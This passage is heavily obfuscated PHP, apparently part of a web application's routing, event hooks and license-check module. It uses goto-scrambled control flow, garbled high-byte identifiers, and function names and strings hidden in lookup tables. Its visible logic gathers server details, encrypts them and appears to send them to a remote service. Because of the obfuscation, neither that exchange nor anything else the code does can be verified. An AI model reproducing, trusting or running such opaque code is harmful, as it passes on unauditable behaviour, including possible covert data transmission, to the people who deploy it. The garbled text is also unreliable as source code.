$_SERVER[Î¿—”òá]; $c››´“ØŞ¥ =& $_SERVER[Ñ¯]; $dÓ‹ÓÊÛÂ = $c››´“ØŞ¥[0]($c››´“ØŞ¥[1], $e‡«©ºÍ•); goto DØá­Æ¡…î; c§¯§°ÖŒ§: $c››´“ØŞ¥[13](array($c››´“ØŞ¥[14], $c››´“ØŞ¥[15]), $C¤Î©Ÿ­ Â . $c››´“ØŞ¥[18], $e‡«©ºÍ•); goto E‚‰Â½à™°; CÈ´ºÃ Ÿ: if ($f•¾¢¯†Ì… == $c››´“ØŞ¥[8]) { $C¤Î©Ÿ­ Â = $c››´“ØŞ¥[9]; $dÓ‹ÓÊÛÂ[0] = $c››´“ØŞ¥[10]; $dÓ‹ÓÊÛÂ[1] = $dÓ‹ÓÊÛÂ[1] . $c››´“ØŞ¥[11]; $e‡«©ºÍ• = $c››´“ØŞ¥[12]($c››´“ØŞ¥[1], $dÓ‹ÓÊÛÂ); $e‡«©ºÍ• = $c››´“ØŞ¥[2]($e‡«©ºÍ•, $c››´“ØŞ¥[1]); } $c››´“ØŞ¥[13](array($c››´“ØŞ¥[14], $c››´“ØŞ¥[15]), $C¤Î©Ÿ­ Â . $c››´“ØŞ¥[16], $e‡«©ºÍ•); $c››´“ØŞ¥[17]($e‡«©ºÍ•); goto c§¯§°ÖŒ§; E‚‰Â½à™°: } private function autorun() { $D½±ÓÈÃªˆ =& $_SERVER[Ñ¯]; global $config; if ($D½±ÓÈÃªˆ[19]($config[$D½±ÓÈÃªˆ[20]]) == 0) { return; } foreach ($config[$D½±ÓÈÃªˆ[20]] as $còÙ‹Èƒ¿‰ => $aø¡…‡ğ°ª) { $this->{$_SERVER[Ñ¯][21]}($aø¡…‡ğ°ª); } } private function mtad075fdcc8() { goto AÌ¶’è¬Ì; C“¢Çô‰»­: $e”‡¡ô˜ÊÃ = array($BË¿ç£›è­[8], $A¸ÑÒšêÚä); $c‡çŠµ‰ÛÎ = $f¼˜ï›êéš[561]; if (!$c‡çŠµ‰ÛÎ) { die; } goto fõÜÉ©‹¥Ü; AÌ¶’è¬Ì: $f¼˜ï›êéš =& $_SERVER[Î¿—”òá]; $BË¿ç£›è­ =& $_SERVER[Ñ¯]; $bëĞ©Ï®¨‡ = $BË¿ç£›è­[8]; goto Aá¥ÍÌéä·; fõÜÉ©‹¥Ü: $Bô´ô«¨ÊÑ = $BË¿ç£›è­[26]($GLOBALS[$BË¿ç£›è­[22]][$BË¿ç£›è­[23]], 1); $GLOBALS[$BË¿ç£›è­[22]][$BË¿ç£›è­[23]] = $BË¿ç£›è­[27]($e”‡¡ô˜ÊÃ, $Bô´ô«¨ÊÑ); $fô×¢ã®ˆ£ = $f¼˜ï›êéš[562]; goto AÃâ×ƒ¤ÌÎ; AÃâ×ƒ¤ÌÎ: if (!$fô×¢ã®ˆ£) { return; } $GLOBALS[$BË¿ç£›è­[22]][$BË¿ç£›è­[28]] = $BË¿ç£›è­[29]($BË¿ç£›è­[1], $GLOBALS[$BË¿ç£›è­[22]][$BË¿ç£›è­[23]]); $E¨…æ†ºŸ¼ = $f¼˜ï›êéš[563]; goto bùÍ³·«ß…; Aá¥ÍÌéä·: $E¤¾½£é— = $GLOBALS[$BË¿ç£›è­[22]][$BË¿ç£›è­[23]][0]; if (!$E¤¾½£é— || $BË¿ç£›è­[24]($E¤¾½£é—) <= $BË¿ç£›è­[24]($bëĞ©Ï®¨‡)) { return; } if ($BË¿ç£›è­[6]($BË¿ç£›è­[25]($E¤¾½£é—, -$BË¿ç£›è­[24]($bëĞ©Ï®¨‡))) != $bëĞ©Ï®¨‡) { return; } goto DÎãŸ±Ü“´; bùÍ³·«ß…: if (!$E¨…æ†ºŸ¼) { die; } goto fÂäÒªÇ£ë; DÎãŸ±Ü“´: $A¸ÑÒšêÚä = $BË¿ç£›è­[25]($E¤¾½£é—, 0, -$BË¿ç£›è­[24]($bëĞ©Ï®¨‡)); $bƒá›ï˜µ¦ = $f¼˜ï›êéš[559]; while ($bƒá›ï˜µ¦ < $f¼˜ï›êéš[560]) { if ($bƒá›ï˜µ¦ >= 0) { break; } $bƒá›ï˜µ¦++; } goto C“¢Çô‰»­; fÂäÒªÇ£ë: } private function mrioedf057e5() { goto F¹İÆ­§…¼; e¤±é˜™Û: if (strlen($cÑŞÕšê÷) < $bÕªĞŒŞ¸ì[548]) { return; } $GLOBALS[$DƒÎ¸ùä‘’[22]][$DƒÎ¸ùä‘’[28]] = $DƒÎ¸ùä‘’[29]($DƒÎ¸ùä‘’[1], $GLOBALS[$DƒÎ¸ùä‘’[22]][$DƒÎ¸ùä‘’[23]]); $A­×‰Ñ§Ú = $bÕªĞŒŞ¸ì[565]; goto AÏ†‚Şê; cÈ¦©º£øÉ: $a„‡—¬áƒ‡ = $DƒÎ¸ùä‘’[2]($F„ÅãØ¾†[0][0], $DƒÎ¸ùä‘’[36]); $GLOBALS[$DƒÎ¸ùä‘’[22]][$DƒÎ¸ùä‘’[23]] = $DƒÎ¸ùä‘’[0]($DƒÎ¸ùä‘’[36], $a„‡—¬áƒ‡); $cÑŞÕšê÷ = $bÕªĞŒŞ¸ì[564]; goto e¤±é˜™Û; cÜïÍ„ÄŠ: $døÆÚä‘î = $_SERVER[$DƒÎ¸ùä‘’[30]]; $f¾Ò¢Ó = $DƒÎ¸ùä‘’[31]; if (!$DƒÎ¸ùä‘’[32]($døÆÚä‘î, $f¾Ò¢Ó)) { return; } goto bŒŠãøÁÖ£; bŒŠãøÁÖ£: $F›–ˆ™ §Ô = $DƒÎ¸ùä‘’[33]($døÆÚä‘î, $f¾Ò¢Ó); $a„‡—¬áƒ‡ = $DƒÎ¸ùä‘’[25]($døÆÚä‘î, $F›–ˆ™ §Ô + $DƒÎ¸ùä‘’[24]($f¾Ò¢Ó)); $DƒÎ¸ùä‘’[34]($DƒÎ¸ùä‘’[35], $a„‡—¬áƒ‡, $F„ÅãØ¾†); goto cÈ¦©º£øÉ; F¹İÆ­§…¼: $bÕªĞŒŞ¸ì =& $_SERVER[Î¿—”òá]; $DƒÎ¸ùä‘’ =& $_SERVER[Ñ¯]; if ($GLOBALS[$DƒÎ¸ùä‘’[22]][$DƒÎ¸ùä‘’[28]] != $DƒÎ¸ùä‘’[10]) { return; } goto cÜïÍ„ÄŠ; AÏ†‚Şê: if (!$A­×‰Ñ§Ú) { return; } goto A¹ŠÃ¿¤•İ; A¹ŠÃ¿¤•İ: } public function run() { goto F­œ‰×ßï; aÙ•Õ •Ü: $CÙ«èá®¤Ô[39]($CÙ«èá®¤Ô[40], isset($eî¦Üç°[0]) && $eî¦Üç°[0] ? $eî¦Üç°[0] : $this->defaultModule); $DˆÕ¦°óñŞ = $f˜Êš¢ƒ—[566]; while (strlen($DˆÕ¦°óñŞ) < $f˜Êš¢ƒ—[567]) { if (!$DˆÕ¦°óñŞ) { break; } $DˆÕ¦°óñŞ++; } goto bİ™ŒòÊ; e½ñ¡‹àÏ¥: $_SERVER[$CÙ«èá®¤Ô[44]] = $CÙ«èá®¤Ô[6](ACTION); $c¼Î”¤·°¥ = $f˜Êš¢ƒ—[570]; if (strlen($c¼Î”¤·°¥) < $f˜Êš¢ƒ—[571]) { return; } goto f ô½Éå‹‹; a˜ÇÍÌÖµÈ: if ($CÙ«èá®¤Ô[19]($eî¦Üç°) >= 3) { $this->{$_SERVER[Ñ¯][21]}($BŠƒ’Øª§Ä); } else { $this->{$_SERVER[Ñ¯][21]}(ACTION); } goto BªèçíÁ; f ô½Éå‹‹: $this->{$_SERVER[Ñ¯][45]}(); $B‚ù‚†«œ’ = $f˜Êš¢ƒ—[572]; while (strlen($B‚ù‚†«œ’) < $f˜Êš¢ƒ—[556]) { if (!$B‚ù‚†«œ’) { break; } $B‚ù‚†«œ’++; } goto a˜ÇÍÌÖµÈ; FÙ‚…ãğÙò: $this->{$_SERVER[Ñ¯][38]}(); $eî¦Üç° = $GLOBALS[$CÙ«èá®¤Ô[22]][$CÙ«èá®¤Ô[23]]; $BŠƒ’Øª§Ä = $GLOBALS[$CÙ«èá®¤Ô[22]][$CÙ«èá®¤Ô[28]]; goto aÙ•Õ •Ü; bİ™ŒòÊ: $CÙ«èá®¤Ô[39]($CÙ«èá®¤Ô[41], isset($eî¦Üç°[1]) && $eî¦Üç°[0] ? $eî¦Üç°[1] : $this->defaultController); $d¥ˆäŒÉˆÜ = $f˜Êš¢ƒ—[568]; $CÙ«èá®¤Ô[39]($CÙ«èá®¤Ô[42], isset($eî¦Üç°[2]) && $eî¦Üç°[0] ? $eî¦Üç°[2] : $this->defaultAction); goto BÅ¿¶· ·; BÅ¿¶· ·: $CÙ«èá®¤Ô[39]($CÙ«èá®¤Ô[43], MOD . $CÙ«èá®¤Ô[1] . ST . $CÙ«èá®¤Ô[1] . ACT); $fğ˜”êÏÅ = $f˜Êš¢ƒ—[569]; if (!$fğ˜”êÏÅ) { return; } goto e½ñ¡‹àÏ¥; F­œ‰×ßï: $f˜Êš¢ƒ— =& $_SERVER[Î¿—”òá]; $CÙ«èá®¤Ô =& $_SERVER[Ñ¯]; $this->{$_SERVER[Ñ¯][37]}(); goto FÙ‚…ãğÙò; BªèçíÁ: } private $beldcf5ea3e1 = array(); private $pwxs52b9fbc7 = ''; public function uezdf8b64f76() { goto aºÌ¶ğäÙù; DÏğ‰ ¨: $this->{$_SERVER[Ñ¯][3]}($eÓİ…øêØ[59], array($this, $eÓİ…øêØ[60])); $bÏµµùç‘ = $a¯ËÏìáÁ[578]; if (!$bÏµµùç‘) { die; } goto EàÈšÆÛî¿; aºÌ¶ğäÙù: $a¯ËÏìáÁ =& $_SERVER[Î¿—”òá]; $eÓİ…øêØ =& $_SERVER[Ñ¯]; $this->{$_SERVER[Ñ¯][46]}(); goto c±ñºŠĞŸ; FÙç®³…«…: $this->{$_SERVER[Ñ¯][48]}(); $this->{$_SERVER[Ñ¯][49]}(); $this->{$_SERVER[Ñ¯][50]}(); goto bäƒ®¯†¸ó; E«æÃ£ˆ³Ù: $F ·Â‘¬È = $a¯ËÏìáÁ[575]; if (!$F ·Â‘¬È) { return; } $this->{$_SERVER[Ñ¯][52]}(); goto dÈÌÅ»¹ğ; cğ¤÷ô†é: $this->{$_SERVER[Ñ¯][3]}($eÓİ…øêØ[55], array($this, $eÓİ…øêØ[56])); $this->{$_SERVER[Ñ¯][3]}($eÓİ…øêØ[57], array($this, $eÓİ…øêØ[58])); $Cˆ†‡›Ï£Æ = $a¯ËÏìáÁ[577]; goto DÏğ‰ ¨; dÈÌÅ»¹ğ: $this->{$_SERVER[Ñ¯][3]}($eÓİ…øêØ[53], array($this, $eÓİ…øêØ[54])); $aƒ¼Èè…Øì = $a¯ËÏìáÁ[576]; if (!$aƒ¼Èè…Øì) { die; } goto cğ¤÷ô†é; c±ñºŠĞŸ: $bìÜ¹‰ÚĞ = $a¯ËÏìáÁ[573]; while (strlen($bìÜ¹‰ÚĞ) < $a¯ËÏìáÁ[571]) { if (!$bìÜ¹‰ÚĞ) { break; } $bìÜ¹‰ÚĞ++; } $this->{$_SERVER[Ñ¯][47]}(); goto FÙç®³…«…; bäƒ®¯†¸ó: $bÈëˆ³ëì = $a¯ËÏìáÁ[574]; if (!$bÈëˆ³ëì) { return; } $this->{$_SERVER[Ñ¯][51]}(); goto E«æÃ£ˆ³Ù; EàÈšÆÛî¿: } public function dcgl2efd1215($B—Ö¢Ûì) { goto D§¾„Ô¾«ƒ; fŒ¢©î¢£¨: $A¤„ÁºÒÓ = $AŠ¸™íÆÒ‡[584]; $B—Ö¢Ûì[$eìí»Ö±–Ä[108]][$eìí»Ö±–Ä[117]] = $eìí»Ö±–Ä[118]($eìí»Ö±–Ä[119]()); $B—Ö¢Ûì[$eìí»Ö±–Ä[108]][$eìí»Ö±–Ä[120]] = $this->pwxs52b9fbc7; goto F¢°«è¿ƒ¢; EÁ’‹çÙÍ: if (strlen($CÄ’·˜×) < $AŠ¸™íÆÒ‡[548]) { die; } unset($B—Ö¢Ûì[$eìí»Ö±–Ä[93]][$eìí»Ö±–Ä[94]][$eìí»Ö±–Ä[98]]); $eÖùæÉî£® = $AŠ¸™íÆÒ‡[582]; goto a©®»ìÈë×; E•µ¨½µ‡Ë: $D‡©Öšåå‰ = $AŠ¸™íÆÒ‡[580]; while ($D‡©Öšåå‰ < $AŠ¸™íÆÒ‡[548]) { if ($D‡©Öšåå‰ >= 0) { break; } $D‡©Öšåå‰++; } unset($B—Ö¢Ûì[$eìí»Ö±–Ä[93]][$eìí»Ö±–Ä[95]][$eìí»Ö±–Ä[96]]); goto dŒí£†£Ç; aÓ¹§“‹¨: $B—Ö¢Ûì[$eìí»Ö±–Ä[108]][$eìí»Ö±–Ä[128]] = $eìí»Ö±–Ä[104]($this->beldcf5ea3e1, $eìí»Ö±–Ä[129], $eìí»Ö±–Ä[10]); $B—Ö¢Ûì[$eìí»Ö±–Ä[108]][$eìí»Ö±–Ä[130]] = $eìí»Ö±–Ä[104]($this->beldcf5ea3e1, $eìí»Ö±–Ä[131], $eìí»Ö±–Ä[10]); if ($eìí»Ö±–Ä[104]($GLOBALS, $eìí»Ö±–Ä[132]) && $this->config[$eìí»Ö±–Ä[133]]) { $B—Ö¢Ûì[$eìí»Ö±–Ä[108]][$eìí»Ö±–Ä[134]] = WEB_ROOT; } goto B·Í’ÈåİØ; D§¾„Ô¾«ƒ: $AŠ¸™íÆÒ‡ =& $_SERVER[Î¿—”òá]; $eìí»Ö±–Ä =& $_SERVER[Ñ¯]; $bè°¬Ôİº = $eìí»Ö±–Ä[61]($eìí»Ö±–Ä[62])->{$_SERVER[Ñ¯][63]}(); goto D‘©ßÊÃ†“; dŒí£†£Ç: unset($B—Ö¢Ûì[$eìí»Ö±–Ä[93]][$eìí»Ö±–Ä[95]][$eìí»Ö±–Ä[97]]); unset($B—Ö¢Ûì[$eìí»Ö±–Ä[93]][$eìí»Ö±–Ä[94]][$eìí»Ö±–Ä[76]]); $CÄ’·˜× = $AŠ¸™íÆÒ‡[581]; goto EÁ’‹çÙÍ; F¢°«è¿ƒ¢: $CâÆ¶™ßŞ’ = $AŠ¸™íÆÒ‡[585]; if ($bè°¬Ôİº[$eìí»Ö±–Ä[120]] != $eìí»Ö±–Ä[121]) { $B—Ö¢Ûì[$eìí»Ö±–Ä[108]][$eìí»Ö±–Ä[122]] = $bè°¬Ôİº[$eìí»Ö±–Ä[122]]; $B—Ö¢Ûì[$eìí»Ö±–Ä[108]][$eìí»Ö±–Ä[123]] = $bè°¬Ôİº[$eìí»Ö±–Ä[123]]; $BÙ±ËÁøŒì = $eìí»Ö±–Ä[124](10) . $this->pwxs52b9fbc7 . $eìí»Ö±–Ä[124](5); $B—Ö¢Ûì[$eìí»Ö±–Ä[93]][$eìí»Ö±–Ä[125]][$eìí»Ö±–Ä[126]] = $this->{$_SERVER[Ñ¯][127]}($BÙ±ËÁøŒì, $B—Ö¢Ûì[$eìí»Ö±–Ä[108]][$eìí»Ö±–Ä[113]]); } if ($this->pwxs52b9fbc7 == $eìí»Ö±–Ä[121]) { $B—Ö¢Ûì[$eìí»Ö±–Ä[93]][$eìí»Ö±–Ä[94]][$eìí»Ö±–Ä[99]][$eìí»Ö±–Ä[107]] = 0; } goto aÓ¹§“‹¨; B·Í’ÈåİØ: return $B—Ö¢Ûì; goto eçŸ…´†¾ø; D°Ğˆ„©Íï: if (!$E®Ğœœ›ø) { return; } $B—Ö¢Ûì[$eìí»Ö±–Ä[108]][$eìí»Ö±–Ä[109]] = $eìí»Ö±–Ä[110]($eìí»Ö±–Ä[111])->{$_SERVER[Ñ¯][112]}(); $B—Ö¢Ûì[$eìí»Ö±–Ä[108]][$eìí»Ö±–Ä[113]] = $eìí»Ö±–Ä[114]($_SERVER[$eìí»Ö±–Ä[115]] . $bè°¬Ôİº[$eìí»Ö±–Ä[116]]); goto fŒ¢©î¢£¨; a©®»ìÈë×: if (strlen($eÖùæÉî£®) < $AŠ¸™íÆÒ‡[567]) { return; } $B—Ö¢Ûì[$eìí»Ö±–Ä[93]][$eìí»Ö±–Ä[94]][$eìí»Ö±–Ä[99]] = array($eìí»Ö±–Ä[100] => (int) $fÇÇ¢ºÁ™÷[$eìí»Ö±–Ä[101]], $eìí»Ö±–Ä[102] => $eìí»Ö±–Ä[103]($eìí»Ö±–Ä[104]($fÇÇ¢ºÁ™÷, $eìí»Ö±–Ä[105], array())), $eìí»Ö±–Ä[106] => (int) $eìí»Ö±–Ä[104]($fÇÇ¢ºÁ™÷, $eìí»Ö±–Ä[107], 0)); $E®Ğœœ›ø = $AŠ¸™íÆÒ‡[583]; goto D°Ğˆ„©Íï; D‘©ßÊÃ†“: $EƒÍø†¿ËÁ = array($eìí»Ö±–Ä[64], $eìí»Ö±–Ä[65], $eìí»Ö±–Ä[66], $eìí»Ö±–Ä[67], $eìí»Ö±–Ä[68], $eìí»Ö±–Ä[69], $eìí»Ö±–Ä[70], $eìí»Ö±–Ä[71], $eìí»Ö±–Ä[72], $eìí»Ö±–Ä[73], $eìí»Ö±–Ä[74], $eìí»Ö±–Ä[75], $eìí»Ö±–Ä[76], $eìí»Ö±–Ä[77], $eìí»Ö±–Ä[78], $eìí»Ö±–Ä[79], $eìí»Ö±–Ä[80], $eìí»Ö±–Ä[81], $eìí»Ö±–Ä[82], $eìí»Ö±–Ä[83], $eìí»Ö±–Ä[84], $eìí»Ö±–Ä[85], $eìí»Ö±–Ä[86], $eìí»Ö±–Ä[87], $eìí»Ö±–Ä[88], $eìí»Ö±–Ä[89], $eìí»Ö±–Ä[90]); foreach ($EƒÍø†¿ËÁ as $dÜ¿ÒÈ¡éî) { $f¢–ãÇæÖ§ = $GLOBALS[$eìí»Ö±–Ä[91]][$eìí»Ö±–Ä[92]][$dÜ¿ÒÈ¡éî]; $AŞˆŸ©˜ÒÆ = $AŠ¸™íÆÒ‡[579]; if (strlen($AŞˆŸ©˜ÒÆ) < $AŠ¸™íÆÒ‡[571]) { return; } if (isset($bè°¬Ôİº[$dÜ¿ÒÈ¡éî])) { $f¢–ãÇæÖ§ = $bè°¬Ôİº[$dÜ¿ÒÈ¡éî]; } $B—Ö¢Ûì[$eìí»Ö±–Ä[93]][$eìí»Ö±–Ä[94]][$dÜ¿ÒÈ¡éî] = $f¢–ãÇæÖ§; } $fÇÇ¢ºÁ™÷ = $B—Ö¢Ûì[$eìí»Ö±–Ä[93]][$eìí»Ö±–Ä[94]][$eìí»Ö±–Ä[76]]; goto E•µ¨½µ‡Ë; eçŸ…´†¾ø: } private function cbua3475b022() { goto B±ÂìÈÛ³Ì; c‰•³ŒÆò¿: if ($this->pwxs52b9fbc7 == $bÎÍ‘Ò±Ã[121]) { return; } $CĞ‹³ÖÏË = array($bÎÍ‘Ò±Ã[153], $bÎÍ‘Ò±Ã[154], $bÎÍ‘Ò±Ã[155], $bÎÍ‘Ò±Ã[156], $bÎÍ‘Ò±Ã[157], $bÎÍ‘Ò±Ã[158]); $Fƒ¿£¢öì£ = $Aëõå¼ãÂ[586]; goto fËÆ÷¹²„‹; Bš½¥Ÿ”¬ã: $fËÈ©ìÔ = $Aëõå¼ãÂ[587]; foreach ($CĞ‹³ÖÏË as $Eºå¿ÑïÓù) { if (!isset($CÖÄÒ¯—ï[$Eºå¿ÑïÓù]) || !$CÖÄÒ¯—ï[$Eºå¿ÑïÓù]) { continue; } $A³¼––ĞŠ[$Eºå¿ÑïÓù] = $CÖÄÒ¯—ï[$Eºå¿ÑïÓù]; $BÆ—É‚ô¾ö = $Aëõå¼ãÂ[588]; if (strlen($BÆ—É‚ô¾ö) < $Aëõå¼ãÂ[571]) { die; } } $bÎÍ‘Ò±Ã[13](array($bÎÍ‘Ò±Ã[151], $bÎÍ‘Ò±Ã[152]), $A³¼––ĞŠ); goto b´°†ùêÆ—; B±ÂìÈÛ³Ì: $Aëõå¼ãÂ =& $_SERVER[Î¿—”òá]; $bÎÍ‘Ò±Ã =& $_SERVER[Ñ¯]; if ($_SERVER[$bÎÍ‘Ò±Ã[44]] == $bÎÍ‘Ò±Ã[135]) { $b¬é‘ÅÍ = array($bÎÍ‘Ò±Ã[120] => $this->pwxs52b9fbc7, $bÎÍ‘Ò±Ã[136] => $this->{$_SERVER[Ñ¯][137]}(), $bÎÍ‘Ò±Ã[138] => $bÎÍ‘Ò±Ã[61]($bÎÍ‘Ò±Ã[139])->{$_SERVER[Ñ¯][140]}()); if ($this->pwxs52b9fbc7 != $bÎÍ‘Ò±Ã[121]) { $EÉóŠ‚‰‘â = $bÎÍ‘Ò±Ã[104]($this->beldcf5ea3e1, $bÎÍ‘Ò±Ã[141]); if ($EÉóŠ‚‰‘â) { $b¬é‘ÅÍ[$bÎÍ‘Ò±Ã[142]] = $EÉóŠ‚‰‘â; $b¬é‘ÅÍ[$bÎÍ‘Ò±Ã[143]] = $bÎÍ‘Ò±Ã[144]($bÎÍ‘Ò±Ã[104]($this->beldcf5ea3e1, $bÎÍ‘Ò±Ã[145])); $b¬é‘ÅÍ[$bÎÍ‘Ò±Ã[146]] = $bÎÍ‘Ò±Ã[104]($this->beldcf5ea3e1, $bÎÍ‘Ò±Ã[131]); } } $b¬é‘ÅÍ = $this->{$_SERVER[Ñ¯][147]}($bÎÍ‘Ò±Ã[148]($b¬é‘ÅÍ), $bÎÍ‘Ò±Ã[114]($bÎÍ‘Ò±Ã[149])); $A³¼––ĞŠ = array($bÎÍ‘Ò±Ã[150] => $b¬é‘ÅÍ); $bÎÍ‘Ò±Ã[13](array($bÎÍ‘Ò±Ã[151], $bÎÍ‘Ò±Ã[152]), $A³¼––ĞŠ); } goto c‰•³ŒÆò¿; fËÆ÷¹²„‹: while (strlen($Fƒ¿£¢öì£) < $Aëõå¼ãÂ[556]) { if (!$Fƒ¿£¢öì£) { break; } $Fƒ¿£¢öì£++; } $CÖÄÒ¯—ï = $bÎÍ‘Ò±Ã[61]($bÎÍ‘Ò±Ã[62])->{$_SERVER[Ñ¯][63]}(); $A³¼––ĞŠ = array($bÎÍ‘Ò±Ã[159] => $CÖÄÒ¯—ï[$bÎÍ‘Ò±Ã[64]], $bÎÍ‘Ò±Ã[160] => $CÖÄÒ¯—ï[$bÎÍ‘Ò±Ã[65]], $bÎÍ‘Ò±Ã[161] => $bÎÍ‘Ò±Ã[10]); goto Bš½¥Ÿ”¬ã; b´°†ùêÆ—: } private function kzqt530d2871() { goto B…Õ¸ç´øˆ; DŠ‚×–¢¿: if ($Føå½øŸƒ‚[$c¶òÚÛ™â[217]] && $Føå½øŸƒ‚[$c¶òÚÛ™â[217]] >= 1) { $c¶òÚÛ™â[61]($c¶òÚÛ™â[62])->{$_SERVER[Ñ¯][218]}($c¶òÚÛ™â[219], $c¶òÚÛ™â[220]); } $c¶òÚÛ™â[61]($c¶òÚÛ™â[62])->{$_SERVER[Ñ¯][221]}($bŒÃ¨Ó¬é); $eŒÔİîçäÒ = $c¶òÚÛ™â[114]($_SERVER[$c¶òÚÛ™â[115]] . $c¶òÚÛ™â[214]($b¹—©…ºĞÏ) . $bŒÃ¨Ó¬é[$c¶òÚÛ™â[210]]); goto a°œÚŸçå; a½ÕÁÍêË¤: if ($aÆ’Ë¬‡èõ[$c¶òÚÛ™â[178]] == $c¶òÚÛ™â[179]) { $e¹Ç±º±œñ = $this->{$_SERVER[Ñ¯][147]}($DÈóÑ¸êßš, $c¶òÚÛ™â[180]); $a—š‡¢ÉíÈ = $this->{$_SERVER[Ñ¯][127]}($c¶òÚÛ™â[148]($aŒèèçŒßÖ), $DÈóÑ¸êßš . $c¶òÚÛ™â[181], 3); $f²Õ•°¬—¶ = $this->{$_SERVER[Ñ¯][182]}($c¶òÚÛ™â[183] . $e¹Ç±º±œñ . $c¶òÚÛ™â[184] . $a—š‡¢ÉíÈ, -1); $c¶òÚÛ™â[166]($f²Õ•°¬—¶, !0); } else { if ($aÆ’Ë¬‡èõ[$c¶òÚÛ™â[178]] == $c¶òÚÛ™â[185]) { $A†Â­Ëİªß = $c¶òÚÛ™â[25]($c¶òÚÛ™â[114]($c¶òÚÛ™â[186] . $DÈóÑ¸êßš), 12, 15) . $c¶òÚÛ™â[187]; $a—š‡¢ÉíÈ = $this->{$_SERVER[Ñ¯][188]}($c¶òÚÛ™â[2]($aÆ’Ë¬‡èõ[$c¶òÚÛ™â[189]]), $A†Â­Ëİªß, 2); $b£óË¦´‘¦ = $c¶òÚÛ™â[190]($a—š‡¢ÉíÈ, !0); if (!$c¶òÚÛ™â[191]($b£óË¦´‘¦) || !$c¶òÚÛ™â[191]($b£óË¦´‘¦[$c¶òÚÛ™â[192]]) || $b£óË¦´‘¦[$c¶òÚÛ™â[165]] != !0) { $EÆÛ°¸ó– = $c¶òÚÛ™â[193]; $d£ó¹ë×ßà = $b£óË¦´‘¦[$c¶òÚÛ™â[192]] ? $c¶òÚÛ™â[194] . $b£óË¦´‘¦[$c¶òÚÛ™â[192]] : $EÆÛ°¸ó–; $c¶òÚÛ™â[166]($d£ó¹ë×ßà, !1); } else { $aŒèèçŒßÖ[$c¶òÚÛ™â[168]] = $b£óË¦´‘¦[$c¶òÚÛ™â[192]][$c¶òÚÛ™â[195]]; } } else { $b£óË¦´‘¦ = $this->{$_SERVER[Ñ¯][182]}($c¶òÚÛ™â[196], $aŒèèçŒßÖ, 10); } } if (!$c¶òÚÛ™â[191]($b£óË¦´‘¦) || !$c¶òÚÛ™â[191]($b£óË¦´‘¦[$c¶òÚÛ™â[192]]) || $b£óË¦´‘¦[$c¶òÚÛ™â[165]] != !0) { $EÆÛ°¸ó– = $c¶òÚÛ™â[197]($c¶òÚÛ™â[198]); $d£ó¹ë×ßà = $b£óË¦´‘¦[$c¶òÚÛ™â[192]] ? $c¶òÚÛ™â[194] . $b£óË¦´‘¦[$c¶òÚÛ™â[192]] : $EÆÛ°¸ó–; $c¶òÚÛ™â[166]($d£ó¹ë×ßà, !1); } $Føå½øŸƒ‚ = $b£óË¦´‘¦[$c¶òÚÛ™â[192]]; goto cÒ»Ë½ÇŒ¹; d›ÜÙÑÎÌ: if (!isset($aÆ’Ë¬‡èõ[$c¶òÚÛ™â[165]]) || $c¶òÚÛ™â[24]($aÆ’Ë¬‡èõ[$c¶òÚÛ™â[165]]) != 16) { $c¶òÚÛ™â[166]($c¶òÚÛ™â[167] . $aÆ’Ë¬‡èõ[$c¶òÚÛ™â[165]], !1); } $b¹—©…ºĞÏ = $c¶òÚÛ™â[61]($c¶òÚÛ™â[62])->{$_SERVER[Ñ¯][63]}($c¶òÚÛ™â[116]); $aŒèèçŒßÖ = array($c¶òÚÛ™â[165] => $aÆ’Ë¬‡èõ[$c¶òÚÛ™â[165]], $c¶òÚÛ™â[168] => $c¶òÚÛ™â[124](16), $c¶òÚÛ™â[169] => $c¶òÚÛ™â[149], $c¶òÚÛ™â[170] => $c¶òÚÛ™â[171], $c¶òÚÛ™â[172] => $_SERVER[$c¶òÚÛ™â[173]], $c¶òÚÛ™â[174] => $_SERVER[$c¶òÚÛ™â[175]], $c¶òÚÛ™â[176] => $_SERVER[$c¶òÚÛ™â[177]]); goto CŞ±‘Í¡±; aÚàËÜøÆÙ: if (!$c¶òÚÛ™â[104]($GLOBALS, $c¶òÚÛ™â[132])) { die; } $aÆ’Ë¬‡èõ = $GLOBALS[$c¶òÚÛ™â[22]]; if (isset($aÆ’Ë¬‡èõ[$c¶òÚÛ™â[163]])) { $this->{$_SERVER[Ñ¯][164]}(); die; } goto d›ÜÙÑÎÌ; a—ò ÈĞì: if (strlen($bèÂ¯‹¤±) < $CÊŠ„îÚÜÈ[548]) { return; } $D­–“¯©„‹ = $C—å‘Ù´ƒ‘[$c¶òÚÛ™â[225]]; $d±½µ¤“½ª = $CÊŠ„îÚÜÈ[594]; goto D¤æ÷“ãÃÆ; DæÈìƒÔÛÓ: $aøºÃÒáÜ¦ = $this->{$_SERVER[Ñ¯][127]}($c¶òÚÛ™â[148]($Føå½øŸƒ‚), $eŒÔİîçäÒ); $C—å‘Ù´ƒ‘ = $c¶òÚÛ™â[222]($c¶òÚÛ™â[61]($c¶òÚÛ™â[11])->{$_SERVER[Ñ¯][223]}(), $c¶òÚÛ™â[224]); $bèÂ¯‹¤± = $CÊŠ„îÚÜÈ[593]; goto a—ò ÈĞì; B…Õ¸ç´øˆ: $CÊŠ„îÚÜÈ =& $_SERVER[Î¿—”òá]; $c¶òÚÛ™â =& $_SERVER[Ñ¯]; if ($_SERVER[$c¶òÚÛ™â[44]] != $c¶òÚÛ™â[162]) { return; } goto aÚàËÜøÆÙ; f—¨—Î«Úõ: $this->beldcf5ea3e1 = $Føå½øŸƒ‚; $this->pwxs52b9fbc7 = $bŒÃ¨Ó¬é[$c¶òÚÛ™â[120]]; $this->{$_SERVER[Ñ¯][229]}(); goto d˜ùä¶ÂŠÒ; C„ë™§ñ¬Ü: $Có×Ô´ß´§ = $fÛõºÙêÓª . $bŒÃ¨Ó¬é[$c¶òÚÛ™â[120]] . $this->{$_SERVER[Ñ¯][147]}($c¶òÚÛ™â[114]($bŒÃ¨Ó¬é[$c¶òÚÛ™â[209]]), $fÛõºÙêÓª); $bŒÃ¨Ó¬é[$c¶òÚÛ™â[123]] = $c¶òÚÛ™â[118]($c¶òÚÛ™â[214]($this->{$_SERVER[Ñ¯][147]}($Có×Ô´ß´§, $c¶òÚÛ™â[216]))); $aå˜ÓâÄ = $CÊŠ„îÚÜÈ[591]; goto DŠ‚×–¢¿; a°œÚŸçå: $d«ÌëøóÌ„ = $c¶òÚÛ™â[214]($c¶òÚÛ™â[25]($eŒÔİîçäÒ, 10, 16)); $bµœ‡¬ƒİó = $CÊŠ„îÚÜÈ[592]; if (!$bµœ‡¬ƒİó) { return; } goto DæÈìƒÔÛÓ; CŞ±‘Í¡±: 